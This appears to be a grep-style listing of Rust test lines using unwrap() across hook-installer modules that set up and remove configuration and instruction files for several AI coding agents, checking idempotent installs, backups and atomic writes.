+src/hooks/init/copilot.rs:441:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:445:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:451:        let content = fs::read_to_string(&instructions_path).unwrap();
+src/hooks/init/copilot.rs:459:        let v: serde_json::Value = serde_json::from_str(COPILOT_HOOK_JSON).unwrap();
+src/hooks/init/copilot.rs:475:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:476:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:484:            serde_json::from_str(&fs::read_to_string(&hook_path).unwrap()).unwrap();
+src/hooks/init/copilot.rs:510:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:512:        fs::create_dir_all(&hooks_dir).unwrap();
+src/hooks/init/copilot.rs:514:        fs::write(&hook_path, old_dual_schema_json).unwrap();
+src/hooks/init/copilot.rs:516:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:519:            serde_json::from_str(&fs::read_to_string(&hook_path).unwrap()).unwrap();
+src/hooks/init/copilot.rs:530:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:531:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:541:        let removed = uninstall_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:545:        let instructions = fs::read_to_string(&instructions_path).unwrap();
+src/hooks/init/copilot.rs:554:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:556:        fs::create_dir_all(&github_dir).unwrap();
+src/hooks/init/copilot.rs:558:        fs::write(&instructions_path, "# My rules\n\nAlways use pnpm.\n").unwrap();
+src/hooks/init/copilot.rs:560:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:561:        uninstall_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:563:        let after = fs::read_to_string(&instructions_path).unwrap();
+src/hooks/init/copilot.rs:570:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:571:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:583:        uninstall_copilot_at(temp.path(), ctx).unwrap();
+src/hooks/init/copilot.rs:590:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:591:        let removed = uninstall_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:597:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:599:        fs::create_dir_all(&hooks_dir).unwrap();
+src/hooks/init/copilot.rs:603:        fs::write(&other_hook, other_content).unwrap();
+src/hooks/init/copilot.rs:605:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:609:            fs::read_to_string(&other_hook).unwrap(),
+src/hooks/init/copilot.rs:617:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:618:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:624:        fs::write(&other_hook, other_content).unwrap();
+src/hooks/init/copilot.rs:626:        uninstall_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:633:            fs::read_to_string(&other_hook).unwrap(),
+src/hooks/init/copilot.rs:645:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:646:        run_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:651:            serde_json::from_str(&fs::read_to_string(&hook_path).unwrap()).unwrap();
+src/hooks/init/copilot.rs:672:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:674:        fs::create_dir_all(&hooks_dir).unwrap();
+src/hooks/init/copilot.rs:676:        fs::write(&hook_path, old_dual_schema_json).unwrap();
+src/hooks/init/copilot.rs:678:        run_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:681:            serde_json::from_str(&fs::read_to_string(&hook_path).unwrap()).unwrap();
+src/hooks/init/copilot.rs:691:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:692:        run_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:698:        let content = fs::read_to_string(&instructions).unwrap();
+src/hooks/init/copilot.rs:705:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:707:        fs::write(&instructions, "# My rules\n\nAlways use pnpm.\n").unwrap();
+src/hooks/init/copilot.rs:709:        run_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:711:        let content = fs::read_to_string(&instructions).unwrap();
+src/hooks/init/copilot.rs:721:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:723:        fs::write(&instructions, "# My rules\n\nAlways use pnpm.\n").unwrap();
+src/hooks/init/copilot.rs:725:        run_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:726:        uninstall_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:728:        let content = fs::read_to_string(&instructions).unwrap();
+src/hooks/init/copilot.rs:735:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:736:        run_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:740:        let removed = uninstall_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:747:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:748:        let removed = uninstall_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:754:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:756:        fs::create_dir_all(&hooks_dir).unwrap();
+src/hooks/init/copilot.rs:759:        fs::write(&other, payload).unwrap();
+src/hooks/init/copilot.rs:761:        run_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:763:        assert_eq!(fs::read_to_string(&other).unwrap(), payload);
+src/hooks/init/copilot.rs:768:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:769:        run_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:773:        fs::write(&other, payload).unwrap();
+src/hooks/init/copilot.rs:775:        uninstall_copilot_global_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:778:        assert_eq!(fs::read_to_string(&other).unwrap(), payload);
+src/hooks/init/copilot.rs:784:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:790:        run_copilot_global_at(temp.path(), ctx).unwrap();
+src/hooks/init/copilot.rs:796:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:798:        fs::create_dir_all(&github_dir).unwrap();
+src/hooks/init/copilot.rs:802:        fs::write(&instructions_path, &malformed).unwrap();
+src/hooks/init/copilot.rs:811:        let after = fs::read_to_string(&instructions_path).unwrap();
+src/hooks/init/copilot.rs:821:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:823:        fs::create_dir_all(&github_dir).unwrap();
+src/hooks/init/copilot.rs:827:        fs::write(&instructions_path, &malformed).unwrap();
+src/hooks/init/cursor.rs:261:        insert_cursor_hook_entry(&mut root).unwrap();
+src/hooks/init/cursor.rs:327:        insert_cursor_hook_entry(&mut json_content).unwrap();
+src/hooks/init/cursor.rs:329:        let hooks = json_content["hooks"]["preToolUse"].as_array().unwrap();
+src/hooks/init/cursor.rs:351:        insert_cursor_hook_entry(&mut json_content).unwrap();
+src/hooks/init/cursor.rs:353:        let pre_tool_use = json_content["hooks"]["preToolUse"].as_array().unwrap();
+src/hooks/init/cursor.rs:377:        let hooks = json_content["hooks"]["preToolUse"].as_array().unwrap();
+src/hooks/init/cursor.rs:397:        let hooks = json_content["hooks"]["preToolUse"].as_array().unwrap();
+src/hooks/init/cursor.rs:430:        let arr = root["hooks"]["preToolUse"].as_array().unwrap();
+src/hooks/init/cursor.rs:453:        let arr = root["hooks"]["preToolUse"].as_array().unwrap();
+src/hooks/init/cursor.rs:455:        assert_eq!(arr[0]["command"].as_str().unwrap(), CURSOR_HOOK_COMMAND);
+src/hooks/init/cursor.rs:459:        let temp = TempDir::new().unwrap();
+src/hooks/init/cursor.rs:470:        .unwrap();
+src/hooks/init/cursor.rs:471:        fs::write(&path, &original).unwrap();
+src/hooks/init/cursor.rs:472:        fs::create_dir(path.with_extension("json.bak")).unwrap();
+src/hooks/init/cursor.rs:477:        assert_eq!(fs::read_to_string(path).unwrap(), original);
+src/hooks/init/cursor.rs:483:        let temp = TempDir::new().unwrap();
+src/hooks/init/cursor.rs:487:        fs::create_dir_all(hook_path.parent().unwrap()).unwrap();
+src/hooks/init/cursor.rs:488:        fs::write(&hook_path, "legacy hook").unwrap();
+src/hooks/init/cursor.rs:489:        fs::write(&hooks_json, "{").unwrap();
+src/hooks/init/cursor.rs:491:        let removed = remove_cursor_hooks_at(&cursor_dir, InitContext::default()).unwrap();
+src/hooks/init/cursor.rs:494:        assert_eq!(fs::read_to_string(hooks_json).unwrap(), "{");
+src/hooks/init/cursor.rs:503:        let temp = TempDir::new().unwrap();
+src/hooks/init/cursor.rs:506:        fs::create_dir_all(&hooks_json).unwrap();
+src/hooks/init/droid.rs:468:                .unwrap();
+src/hooks/init/droid.rs:476:            resolve_droid_dir_from_env(Some(home.clone()), Some(OsString::new())).unwrap();
+src/hooks/init/droid.rs:483:        insert_droid_hook_entry(&mut root, DroidLayout::Nested).unwrap();
+src/hooks/init/droid.rs:484:        let pre = root["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/droid.rs:487:        let hooks = pre[0]["hooks"].as_array().unwrap();
+src/hooks/init/droid.rs:496:        insert_droid_hook_entry(&mut root, DroidLayout::Root).unwrap();
+src/hooks/init/droid.rs:501:        let pre = root["PreToolUse"].as_array().unwrap();
+src/hooks/init/droid.rs:517:        insert_droid_hook_entry(&mut root, DroidLayout::Nested).unwrap();
+src/hooks/init/droid.rs:518:        let pre = root["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/droid.rs:520:        let hooks = pre[0]["hooks"].as_array().unwrap();
+src/hooks/init/droid.rs:569:        let hooks = root["hooks"]["PreToolUse"][0]["hooks"].as_array().unwrap();
+src/hooks/init/droid.rs:614:        let temp = TempDir::new().unwrap();
+src/hooks/init/droid.rs:616:        let target = resolve_droid_install_target(&droid_dir).unwrap();
+src/hooks/init/droid.rs:625:        let temp = TempDir::new().unwrap();
+src/hooks/init/droid.rs:627:        fs::create_dir_all(&droid_dir).unwrap();
+src/hooks/init/droid.rs:632:        .unwrap();
+src/hooks/init/droid.rs:637:        .unwrap();
+src/hooks/init/droid.rs:638:        let target = resolve_droid_install_target(&droid_dir).unwrap();
+src/hooks/init/droid.rs:647:        let temp = TempDir::new().unwrap();
+src/hooks/init/droid.rs:649:        fs::create_dir_all(&droid_dir).unwrap();
+src/hooks/init/droid.rs:650:        fs::write(droid_dir.join("hooks.json"), r#"{"PostToolUse":[]}"#).unwrap();
+src/hooks/init/droid.rs:655:        .unwrap();
+src/hooks/init/droid.rs:656:        let target = resolve_droid_install_target(&droid_dir).unwrap();
+src/hooks/init/droid.rs:666:        let temp = TempDir::new().unwrap();
+src/hooks/init/droid.rs:669:        fs::create_dir_all(&legacy_dir).unwrap();
+src/hooks/init/droid.rs:674:        .unwrap();
+src/hooks/init/droid.rs:675:        let target = resolve_droid_install_target(&droid_dir).unwrap();
+src/hooks/init/droid.rs:681:        let temp = TempDir::new().unwrap();
+src/hooks/init/droid.rs:689:        run_droid_mode_at(&droid_dir, true, ctx).unwrap();
+src/hooks/init/droid.rs:694:        run_droid_mode_at(&droid_dir, true, ctx).unwrap();
+src/hooks/init/droid.rs:695:        let content = fs::read_to_string(&hooks_json).unwrap();
+src/hooks/init/droid.rs:696:        let v: serde_json::Value = serde_json::from_str(&content).unwrap();
+src/hooks/init/droid.rs:697:        let hooks = v["PreToolUse"][0]["hooks"].as_array().unwrap();
+src/hooks/init/droid.rs:701:        let removed = uninstall_droid_at(&droid_dir, ctx).unwrap();
+src/hooks/init/droid.rs:703:        let post = fs::read_to_string(&hooks_json).unwrap();
+src/hooks/init/droid.rs:704:        let v: serde_json::Value = serde_json::from_str(&post).unwrap();
+src/hooks/init/droid.rs:713:        let temp = TempDir::new().unwrap();
+src/hooks/init/droid.rs:715:        fs::create_dir_all(&droid_dir).unwrap();
+src/hooks/init/droid.rs:720:        .unwrap();
+src/hooks/init/droid.rs:728:        .unwrap();
+src/hooks/init/droid.rs:735:        run_droid_mode_at(&droid_dir, true, ctx).unwrap();
+src/hooks/init/droid.rs:738:            serde_json::from_str(&fs::read_to_string(droid_dir.join("hooks.json")).unwrap())
+src/hooks/init/droid.rs:739:                .unwrap();
+src/hooks/init/droid.rs:745:            serde_json::from_str(&fs::read_to_string(droid_dir.join("settings.json")).unwrap())
+src/hooks/init/droid.rs:746:                .unwrap();
+src/hooks/init/droid.rs:755:        let temp = TempDir::new().unwrap();
+src/hooks/init/droid.rs:763:        .unwrap();
+src/hooks/init/droid.rs:764:        fs::write(&path, &original).unwrap();
+src/hooks/init/droid.rs:765:        fs::create_dir(path.with_extension("json.bak")).unwrap();
+src/hooks/init/droid.rs:777:        assert_eq!(fs::read_to_string(path).unwrap(), original);
+src/hooks/init/droid.rs:782:        let temp = TempDir::new().unwrap();
+src/hooks/init/droid.rs:786:        fs::create_dir_all(legacy_path.parent().unwrap()).unwrap();
+src/hooks/init/droid.rs:794:        .unwrap();
+src/hooks/init/droid.rs:795:        fs::write(&root_path, &hook_json).unwrap();
+src/hooks/init/droid.rs:796:        fs::write(&legacy_path, &hook_json).unwrap();
+src/hooks/init/droid.rs:797:        fs::create_dir(root_path.with_extension("json.bak")).unwrap();
+src/hooks/init/droid.rs:802:        assert_eq!(fs::read_to_string(&root_path).unwrap(), hook_json);
+src/hooks/init/droid.rs:804:            serde_json::from_str(&fs::read_to_string(&legacy_path).unwrap()).unwrap();
+src/hooks/init/gemini.rs:345:        let tmp = TempDir::new().unwrap();
+src/hooks/init/gemini.rs:347:        fs::create_dir_all(&gemini_dir).unwrap();
+src/hooks/init/gemini.rs:350:        fs::write(&settings_path, original).unwrap();
+src/hooks/init/gemini.rs:360:            result.unwrap(),
+src/hooks/init/gemini.rs:364:        let content = fs::read_to_string(&settings_path).unwrap();
+src/hooks/init/hermes.rs:536:        let temp = TempDir::new().unwrap();
+src/hooks/init/hermes.rs:537:        run_hermes_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:547:            fs::read_to_string(&init_path).unwrap(),
+src/hooks/init/hermes.rs:551:            fs::read_to_string(&manifest_path).unwrap(),
+src/hooks/init/hermes.rs:555:        let config = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:563:        let temp = TempDir::new().unwrap();
+src/hooks/init/hermes.rs:569:        .unwrap();
+src/hooks/init/hermes.rs:571:        run_hermes_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:572:        let first = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:573:        run_hermes_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:574:        let second = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:586:        let temp = TempDir::new().unwrap();
+src/hooks/init/hermes.rs:592:        .unwrap();
+src/hooks/init/hermes.rs:594:        run_hermes_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:595:        let first = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:596:        run_hermes_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:597:        let second = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:610:        let temp = TempDir::new().unwrap();
+src/hooks/init/hermes.rs:617:        fs::create_dir_all(&other_plugin_dir).unwrap();
+src/hooks/init/hermes.rs:618:        fs::write(&other_plugin_file, "keep").unwrap();
+src/hooks/init/hermes.rs:623:        .unwrap();
+src/hooks/init/hermes.rs:625:        run_hermes_mode_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:626:        let first = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:627:        run_hermes_mode_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:628:        let second = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:635:        assert_eq!(fs::read_to_string(&other_plugin_file).unwrap(), "keep");
+src/hooks/init/hermes.rs:637:        let removed_first = uninstall_hermes_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:638:        let removed_second = uninstall_hermes_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:644:        assert_eq!(fs::read_to_string(&other_plugin_file).unwrap(), "keep");
+src/hooks/init/hermes.rs:646:        let uninstalled = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:658:        let temp = TempDir::new().unwrap();
+src/hooks/init/hermes.rs:666:        fs::create_dir_all(nested_plugin_file.parent().unwrap()).unwrap();
+src/hooks/init/hermes.rs:667:        fs::write(&nested_plugin_file, "rtk").unwrap();
+src/hooks/init/hermes.rs:668:        fs::create_dir_all(&other_plugin_dir).unwrap();
+src/hooks/init/hermes.rs:669:        fs::write(&other_plugin_file, "keep").unwrap();
+src/hooks/init/hermes.rs:674:        .unwrap();
+src/hooks/init/hermes.rs:676:        let removed_first = uninstall_hermes_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:677:        let removed_second = uninstall_hermes_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:683:        assert_eq!(fs::read_to_string(&other_plugin_file).unwrap(), "keep");
+src/hooks/init/hermes.rs:685:        let config = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:695:        let temp = TempDir::new().unwrap();
+src/hooks/init/hermes.rs:703:        fs::create_dir_all(nested_plugin_file.parent().unwrap()).unwrap();
+src/hooks/init/hermes.rs:704:        fs::write(&nested_plugin_file, "rtk").unwrap();
+src/hooks/init/hermes.rs:705:        fs::create_dir_all(&other_plugin_dir).unwrap();
+src/hooks/init/hermes.rs:706:        fs::write(&other_plugin_file, "keep").unwrap();
+src/hooks/init/hermes.rs:711:        .unwrap();
+src/hooks/init/hermes.rs:713:        let removed_first = uninstall_hermes_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:714:        let removed_second = uninstall_hermes_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:720:        assert_eq!(fs::read_to_string(&other_plugin_file).unwrap(), "keep");
+src/hooks/init/hermes.rs:722:        let config = fs::read_to_string(&config_path).unwrap();
+src/hooks/init/hermes.rs:734:        let temp = TempDir::new().unwrap();
+src/hooks/init/hermes.rs:737:        let removed_first = uninstall_hermes_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:738:        let removed_second = uninstall_hermes_at(hermes_home, InitContext::default()).unwrap();
+src/hooks/init/hermes.rs:1024:            resolve_hermes_home_from_env(Some(home_dir), Some(hermes_home.clone())).unwrap();
+src/hooks/init/hermes.rs:1034:            resolve_hermes_home_from_env(Some(home_dir.clone()), Some(OsString::new())).unwrap();
+src/hooks/init/hermes.rs:1036:            resolve_hermes_home_from_env(Some(home_dir.clone()), None).unwrap();
+src/hooks/init/instructions_agents.rs:224:        let temp = TempDir::new().unwrap();
+src/hooks/init/instructions_agents.rs:225:        run_kilocode_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/instructions_agents.rs:229:        let content = fs::read_to_string(&rules_path).unwrap();
+src/hooks/init/instructions_agents.rs:235:        let temp = TempDir::new().unwrap();
+src/hooks/init/instructions_agents.rs:236:        run_kilocode_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/instructions_agents.rs:239:        let first = fs::read_to_string(&path).unwrap();
+src/hooks/init/instructions_agents.rs:242:        run_kilocode_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/instructions_agents.rs:243:        let second = fs::read_to_string(&path).unwrap();
+src/hooks/init/instructions_agents.rs:249:        let temp = TempDir::new().unwrap();
+src/hooks/init/instructions_agents.rs:250:        run_kimi_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/instructions_agents.rs:259:        let content = fs::read_to_string(&agents_md).unwrap();
+src/hooks/init/instructions_agents.rs:268:        let temp = TempDir::new().unwrap();
+src/hooks/init/instructions_agents.rs:269:        run_kimi_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/instructions_agents.rs:272:        let first = fs::read_to_string(&path).unwrap();
+src/hooks/init/instructions_agents.rs:275:        run_kimi_mode_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/instructions_agents.rs:276:        let second = fs::read_to_string(&path).unwrap();
+src/hooks/init/instructions_agents.rs:290:            let temp = TempDir::new().unwrap();
+src/hooks/init/instructions_agents.rs:292:            run_kilocode_mode_at(temp.path(), ctx).unwrap();
+src/hooks/init/instructions_agents.rs:294:                fs::read_to_string(temp.path().join(".kilocode/rules/rtk-rules.md")).unwrap(),
+src/hooks/init/instructions_agents.rs:299:            run_kimi_mode_at(temp.path(), ctx).unwrap();
+src/hooks/init/instructions_agents.rs:300:            let agents_md = fs::read_to_string(temp.path().join(AGENTS_MD)).unwrap();
+src/hooks/init/instructions_agents.rs:308:            fs::create_dir_all(temp.path().join("codex")).unwrap();
+src/hooks/init/instructions_agents.rs:316:            .unwrap();
+src/hooks/init/instructions_agents.rs:318:                fs::read_to_string(&codex_rtk).unwrap(),
+src/hooks/init/mod.rs:2260:    fs::create_dir_all(&claude_dir).unwrap();
+src/hooks/init/mod.rs:2555:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:2558:        fs::write(&claude_md, "# My stuff\n\n@RTK.md\n").unwrap();
+src/hooks/init/mod.rs:2560:        let content = fs::read_to_string(&claude_md).unwrap();
+src/hooks/init/mod.rs:2567:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:2579:        .unwrap();
+src/hooks/init/mod.rs:2594:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:2596:        fs::write(&target, "original").unwrap();
+src/hooks/init/mod.rs:2607:        .unwrap();
+src/hooks/init/mod.rs:2611:            fs::read_to_string(&target).unwrap(),
+src/hooks/init/mod.rs:2620:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:2623:        fs::write(&claude_md, RTK_INSTRUCTIONS).unwrap();
+src/hooks/init/mod.rs:2624:        let content = fs::read_to_string(&claude_md).unwrap();
+src/hooks/init/mod.rs:2642:        .unwrap();
+src/hooks/init/mod.rs:2649:                .unwrap()
+src/hooks/init/mod.rs:2654:        let pre_tool_use = json_content["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/mod.rs:2657:        let command = pre_tool_use[0]["hooks"][0]["command"].as_str().unwrap();
+src/hooks/init/mod.rs:2682:        .unwrap();
+src/hooks/init/mod.rs:2684:        let pre_tool_use = json_content["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/mod.rs:2688:        let first_command = pre_tool_use[0]["hooks"][0]["command"].as_str().unwrap();
+src/hooks/init/mod.rs:2692:        let second_command = pre_tool_use[1]["hooks"][0]["command"].as_str().unwrap();
+src/hooks/init/mod.rs:2711:        .unwrap();
+src/hooks/init/mod.rs:2725:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:2729:        atomic_write(&file_path, content).unwrap();
+src/hooks/init/mod.rs:2732:        let written = fs::read_to_string(&file_path).unwrap();
+src/hooks/init/mod.rs:2741:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:2748:        atomic_write(&link_path, "{\"hooks\":{}}").unwrap();
+src/hooks/init/mod.rs:2750:        let meta = fs::symlink_metadata(&link_path).unwrap();
+src/hooks/init/mod.rs:2752:        let written = fs::read_to_string(&target_path).unwrap();
+src/hooks/init/mod.rs:2761:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:2763:        fs::create_dir(&subdir).unwrap();
+src/hooks/init/mod.rs:2770:        atomic_write(&link_path, "{\"patched\":true}").unwrap();
+src/hooks/init/mod.rs:2772:        let meta = fs::symlink_metadata(&link_path).unwrap();
+src/hooks/init/mod.rs:2774:        let written = fs::read_to_string(&target_path).unwrap();
+src/hooks/init/mod.rs:2782:        let parsed: serde_json::Value = serde_json::from_str(original).unwrap();
+src/hooks/init/mod.rs:2783:        let serialized = serde_json::to_string(&parsed).unwrap();
+src/hooks/init/mod.rs:2951:                        .unwrap()
+src/hooks/init/mod.rs:2953:                _ => insert_trae_hook_entry(&mut root).unwrap(),
+src/hooks/init/mod.rs:2956:            let groups = root["hooks"]["PreToolUse"].as_array_mut().unwrap();
+src/hooks/init/mod.rs:2957:            groups.last_mut().unwrap()["hooks"]
+src/hooks/init/mod.rs:2959:                .unwrap()
+src/hooks/init/mod.rs:2987:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:2990:        fs::write(&claude_md, RTK_INSTRUCTIONS).unwrap();
+src/hooks/init/mod.rs:2993:        let content = fs::read_to_string(&claude_md).unwrap();
+src/hooks/init/mod.rs:3066:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:3069:        fs::write(&empty, "  \n").unwrap();
+src/hooks/init/mod.rs:3071:        assert!(read_json_file(&missing).unwrap().is_none());
+src/hooks/init/mod.rs:3072:        assert_eq!(read_json_file(&empty).unwrap(), Some(serde_json::json!({})));
+src/hooks/init/mod.rs:3078:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:3080:        fs::write(&invalid, "{").unwrap();
+src/hooks/init/mod.rs:3091:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:3093:        fs::write(&path, "old").unwrap();
+src/hooks/init/mod.rs:3095:        let backup = backup_and_atomic_write(&path, "new").unwrap().unwrap();
+src/hooks/init/mod.rs:3098:        assert_eq!(fs::read_to_string(path).unwrap(), "new");
+src/hooks/init/mod.rs:3099:        assert_eq!(fs::read_to_string(backup).unwrap(), "old");
+src/hooks/init/mod.rs:3104:        let temp = TempDir::new().unwrap();
+src/hooks/init/mod.rs:3106:        fs::write(&path, "old").unwrap();
+src/hooks/init/mod.rs:3107:        fs::create_dir(path.with_extension("json.bak")).unwrap();
+src/hooks/init/mod.rs:3112:        assert_eq!(fs::read_to_string(path).unwrap(), "old");
+src/hooks/init/opencode.rs:236:            let temp = TempDir::new().unwrap();
+src/hooks/init/opencode.rs:239:            fs::create_dir_all(plugin_path.parent().unwrap()).unwrap();
+src/hooks/init/opencode.rs:240:            fs::write(&plugin_path, "// whatever was already there").unwrap();
+src/hooks/init/opencode.rs:246:            .unwrap();
+src/hooks/init/opencode.rs:252:                fs::read_to_string(&plugin_path).unwrap(),
+src/hooks/init/opencode.rs:257:            fs::remove_file(&plugin_path).unwrap();
+src/hooks/init/opencode.rs:263:            .unwrap();
+src/hooks/init/opencode.rs:277:            let temp = TempDir::new().unwrap();
+src/hooks/init/opencode.rs:281:                    .unwrap();
+src/hooks/init/opencode.rs:283:            assert_eq!(fs::read_to_string(&plugin_path).unwrap(), OPENCODE_PLUGIN);
+src/hooks/init/opencode.rs:289:        let temp = TempDir::new().unwrap();
+src/hooks/init/opencode.rs:293:        fs::create_dir_all(plugin_path.parent().unwrap()).unwrap();
+src/hooks/init/opencode.rs:299:                .unwrap();
+src/hooks/init/opencode.rs:301:        let content = fs::read_to_string(&plugin_path).unwrap();
+src/hooks/init/opencode.rs:304:        fs::write(&plugin_path, "// old").unwrap();
+src/hooks/init/opencode.rs:307:                .unwrap();
+src/hooks/init/opencode.rs:309:        let content_updated = fs::read_to_string(&plugin_path).unwrap();
+src/hooks/init/opencode.rs:315:        let temp = TempDir::new().unwrap();
+src/hooks/init/opencode.rs:318:        fs::create_dir_all(plugin_path.parent().unwrap()).unwrap();
+src/hooks/init/opencode.rs:319:        fs::write(&plugin_path, OPENCODE_PLUGIN).unwrap();
+src/hooks/init/opencode.rs:323:        fs::remove_file(&plugin_path).unwrap();
+src/hooks/init/pi.rs:678:    fs::create_dir_all(&pi_dir).unwrap();
+src/hooks/init/pi.rs:686:    fs::create_dir_all(&omp_dir).unwrap();
+src/hooks/init/pi.rs:954:            run_pi_mode(true, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:959:            let content = fs::read_to_string(&plugin).unwrap();
+src/hooks/init/pi.rs:978:            run_pi_mode(true, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:989:            run_pi_mode(true, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:1004:            .unwrap();
+src/hooks/init/pi.rs:1014:            let path = pi_plugin_path_for_scope(true).unwrap();
+src/hooks/init/pi.rs:1021:        let path = pi_plugin_path_for_scope(false).unwrap();
+src/hooks/init/pi.rs:1051:            .unwrap();
+src/hooks/init/pi.rs:1071:            run_pi_mode(true, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:1091:            .unwrap();
+src/hooks/init/pi.rs:1106:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1109:        fs::write(&path, modified).unwrap();
+src/hooks/init/pi.rs:1119:        assert_eq!(fs::read_to_string(path).unwrap(), modified);
+src/hooks/init/pi.rs:1128:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1130:        fs::write(&path, format!("{}\n// user modification\n", PI_PLUGIN)).unwrap();
+src/hooks/init/pi.rs:1158:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1160:        fs::write(&path, format!("{}\n// user modification\n", PI_PLUGIN)).unwrap();
+src/hooks/init/pi.rs:1175:        result.unwrap();
